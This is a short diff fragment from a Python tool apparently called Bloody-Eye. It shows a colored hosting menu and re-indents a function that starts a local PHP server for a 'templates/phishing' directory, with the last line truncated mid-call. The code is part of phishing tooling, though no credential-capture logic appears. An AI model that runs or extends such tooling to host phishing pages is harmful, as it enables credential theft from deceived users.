@@ -528,7 +528,7 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.YELLOW+" Localhost")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
     print("")
-def ngrokserver():
+    def ngrokserver():
        try:
           with open("log","w") as phplog:
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,st$
